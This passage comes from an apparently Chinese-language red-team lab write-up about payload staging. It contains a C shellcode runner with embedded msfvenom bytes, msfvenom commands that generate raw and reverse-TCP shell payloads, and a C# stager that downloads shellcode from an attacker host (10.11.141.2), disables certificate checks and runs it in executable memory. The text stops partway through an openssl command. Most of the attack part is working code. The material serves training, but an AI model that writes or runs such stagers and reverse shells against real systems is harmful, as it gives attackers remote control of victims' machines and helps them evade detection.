class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span><span class="line"><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> stager</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> };</span></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        DWORD oldProtect;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">VirtualProtect</span><span style="color: #ABB2BF">(stager, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(stager), PAGE_EXECUTE_READ, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">oldProtect);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">shellcode)() </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)())(</span><span style="color: #C678DD">void*</span><span style="color: #ABB2BF">)stager;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">shellcode</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>编译</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">i686-w64-mingw32-gcc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">calc.c</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">calc-MSF.exe</span></span></code></pre></div></div></figure><h4 id="从可执行文件（EXE）中提取-Shellcode"><a href="#从可执行文件（EXE）中提取-Shellcode" class="headerlink" title="从可执行文件（EXE）中提取 Shellcode"></a>从可执行文件（EXE）中提取 Shellcode</h4><p>Shellcode 并不总是以 C 语言数组的形式存在。在更高级的场景中，它可能被存储在原始的二进制文件（<code>.bin</code>）中，这是许多命令与控制（C2）框架的首选格式。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">生成</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.bin</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">文件</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/exec</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd=calc.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">raw</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">/tmp/example.bin</span></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">查看文件类型</span></span><span class="line"><span style="color: #61AFEF">file</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/example.bin</span></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">用</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">xxd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">提取</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">进制</span></span><span class="line"><span style="color: #61AFEF">xxd</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/example.bin</span></span></code></pre></div></div></figure><p>可以从上面生成的 C 代码 shellcode 比对，这俩是一样的。</p><p>但是我觉得这个标题描述有问题，应该是找一个 exe 文件直接提取他的入口点，然后 dump 出来，这样才是从 exe 文件中提取。</p><h2 id="阶段-Payload"><a href="#阶段-Payload" class="headerlink" title="阶段 Payload"></a>阶段 Payload</h2><p>之前在玩 MSF 的时候就发现分大马和小马了，这就是房间里面说的 <strong>staged</strong> or <strong>stageless</strong> payloads。</p><p>在渗透测试和恶意软件开发中，Payload 通常分为两种类型：<strong>无阶段 (Stageless)</strong> 和 **分阶段 (Staged)**。它们代表了两种不同的代码投递和执行策略，各有优缺点，需要根据目标环境来选择。</p><h3 id="无阶段-Payload"><a href="#无阶段-Payload" class="headerlink" title="无阶段 Payload"></a><strong>无阶段 Payload</strong></h3><p>无阶段 Payload 是一个<strong>单一、完整</strong>的可执行文件，包含了恶意代码所需的所有功能。它不需要从攻击者的服务器下载任何额外的组件。</p><img src="/thm_rthe/f92f294a9e599967a0961b4273381be6.png" class="" title="Staged Payload - stage0"><p><strong>优点：</strong></p><ul><li><strong>独立性强</strong>：Payload 包含了所有必需的代码，无需额外的网络连接。</li><li><strong>隐蔽性高</strong>：由于没有后续的网络下载行为，它更难被网络安全设备（如 IPS）检测到。</li><li><strong>适用于受限环境</strong>：特别适合在无法进行出站网络连接的封闭网络或气隙网络（air-gapped networks）中使用。</li></ul><h3 id="分阶段-Payload"><a href="#分阶段-Payload" class="headerlink" title="分阶段 Payload"></a><strong>分阶段 Payload</strong></h3><p>分阶段 Payload 采用两步走策略。第一阶段是一个很小的 <strong>Stager</strong>（或称“小马”），它的唯一任务就是与攻击者服务器建立连接，然后下载并执行第二阶段的<strong>最终 Payload</strong>（或称“大马”）。</p><img src="/thm_rthe/fd8a98b3cb79cca98a1e0dfd0292ea61.png" class="" title="Staged Payload - Send ReveseShell"><p><strong>优点：</strong></p><ul><li><strong>体积小</strong>：Stager 的体积很小，减少了初始文件的磁盘占用，更易于投递。</li><li><strong>增强隐蔽性</strong>：最终的 Payload 不会直接存储在磁盘上，而是在内存中加载和执行，这使得它更难被传统的基于签名的杀毒软件检测到。</li><li><strong>灵活性高</strong>：同一个 Stager 可以用于下载不同的最终 Payload，攻击者可以根据需要动态更换 Payload，而无需重新投递文件。</li><li><strong>保护 Payload</strong>：核心的恶意代码（最终 Payload）永远不会暴露在磁盘上，从而保护了其免受蓝队分析。</li></ul><hr><h3 id="选择合适的-Payload"><a href="#选择合适的-Payload" class="headerlink" title="选择合适的 Payload"></a><strong>选择合适的 Payload</strong></h3><ul><li>当你的目标是<strong>网络连接受限</strong>的环境，或者你想<strong>避免网络流量被监测</strong>时，<strong>无阶段</strong> Payload 是更好的选择。例如，进行 USB 投递攻击时，无阶段 Payload 能确保在没有网络连接的情况下也能成功执行。</li><li>当你的主要目标是<strong>最小化本地足迹</strong>，并<strong>避免被杀毒软件检测</strong>时，<strong>分阶段</strong> Payload 是更优的方案。它利用了内存执行的优势，让分析和取证变得更加困难。</li></ul><h4 id="Metasploit-中的-Stager"><a href="#Metasploit-中的-Stager" class="headerlink" title="Metasploit 中的 Stager"></a>Metasploit 中的 Stager</h4><p>如果要生成反向 TCP shell，会发现有两种有效载荷可用于此目的，名称略有不同（注意 <code>shell</code> 之后的 <code>_</code> 与 <code>/</code> ）：</p><table><thead><tr><th>Payload</th><th>Type</th></tr></thead><tbody><tr><td>windows&#x2F;x64&#x2F;shell_reverse_tcp</td><td>Stageless payload</td></tr><tr><td>windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</td><td>Staged payload</td></tr></tbody></table><h4 id="创建你自己的-Stager"><a href="#创建你自己的-Stager" class="headerlink" title="创建你自己的 Stager"></a>创建你自己的 Stager</h4><p>要创建分阶段有效载荷，我们将使用 <a href="https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs">@mvelazc0 提供的 stager 代码</a>的略微修改版本。</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Net</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Text</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Configuration</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Install</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Security</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Cryptography</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">X509Certificates</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc</span></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flAllocationType</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flProtect</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadAttributes</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwStackSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">param</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwCreationFlags</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadId</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    // https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span></span><span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hHandle</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwMilliseconds</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x1000</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;https://10.11.141.2/shellcode.bin&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">Stager</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Stager</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">url</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 创建一个 WebClient 对象</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">WebClient</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">wc</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">WebClient</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 允许自签证书</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ServicePointManager</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ServerCertificateValidationCallback</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">delegate</span><span style="color: #ABB2BF"> { </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">; };</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ServicePointManager</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">SecurityProtocol</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">SecurityProtocolType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Tls12</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 下载 Shellcode 写入到变量中</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">shellcode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wc</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">DownloadData</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 分配内存</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 写入内存</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">shellcode</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)(</span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">), </span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 定义线程句柄</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 启动线程</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 等待线程执行完成</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xFFFFFFFF</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>使用我们的 Stager 运行反向 Shell</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">生成一个</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">shellcode</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">7474</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">raw</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">shellcode.bin</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;\x00\x0a\x0d&#39;</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">创建自签证书</span></span><span class="line"><span style="color: #61AFEF">openssl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">req</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x509</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-newkey</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rsa:4096</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-keyout</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">key.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-out</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cert.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-sha256</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-days</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3650</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-nodes</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-subj</span><span style="color: #ABB2BF"> </span><span style="color: 